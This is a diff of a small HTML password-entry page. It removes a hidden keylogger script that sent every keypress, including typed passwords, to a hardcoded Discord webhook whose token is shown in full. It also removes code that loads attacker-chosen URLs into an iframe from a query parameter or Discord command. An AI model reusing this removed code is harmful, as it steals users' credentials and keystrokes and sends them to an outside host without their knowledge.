@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nothing Special</title>
+    <title>Password Entry</title>
     <style>
         body {
             display: flex;
@@ -11,6 +11,7 @@
             align-items: center;
             height: 100vh;
             margin: 0;
+            background-color: #ffffff; /* Default background color */
         }
     
         form {
@@ -36,70 +37,15 @@
             color: #fff;
             cursor: pointer;
         }
-
-        iframe {
-            width: 100%;
-            height: 400px; /* Adjust the height as needed */
-            border: 1px solid #ccc;
-        }
     </style>
 </head>
 <body>
-    
-    <script>
-        // Your Discord webhook URL
-        var DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1218575470186991708/9dMvk0-5RBBPvUrsm7kv7oIS183aXZpxcg6LGMazPz5Cj8jsRhGQ2_pNCRmuaumuDpNj";
 
-        document.addEventListener("keypress", function(event) {
-            var key_pressed = event.key;
-            var message = "Key pressed: " + key_pressed;
-            sendToDiscord(message);
-        });
+<form action="#" method="post">
+    <label for="password">Password:</label>
+    <input type="password" id="password" name="password" required>
+    <input type="submit" value="Submit">
+</form>
 
-        function sendToDiscord(message) {
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", DISCORD_WEBHOOK_URL, true);
-            xhr.setRequestHeader("Content-Type", "application/json");
-            xhr.send(JSON.stringify({ content: message }));
-        }
-
-        // Function to handle iframe command
-        function handleIframeCommand(link) {
-            var iframe = document.querySelector('iframe');
-            iframe.src = link;
-        }
-
-        // Discord command handler
-        function handleDiscordCommand(command) {
-            var commandParts = command.split(' ');
-            if (commandParts[0] === '!iframe' && commandParts.length === 2) {
-                var link = commandParts[1];
-                handleIframeCommand(link);
-            }
-        }
-    </script>
-
-    <form action="#" method="post">
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required>
-        <input type="submit" value="Submit">
-    </form>
-
-    <!-- Empty iframe -->
-    <iframe frameborder="0" src="" style="height: 100%;"></iframe>
-
-    <script>
-        // Function to update iframe source based on query parameter
-        function updateIframe() {
-            var urlParams = new URLSearchParams(window.location.search);
-            var iframeUrl = urlParams.get('iframeUrl');
-            if (iframeUrl) {
-                document.getElementById('myIframe').src = iframeUrl;
-            }
-        }
-
-        // Call the function when the page loads
-        window.onload = updateIframe;
-    </script>
 </body>
 </html>
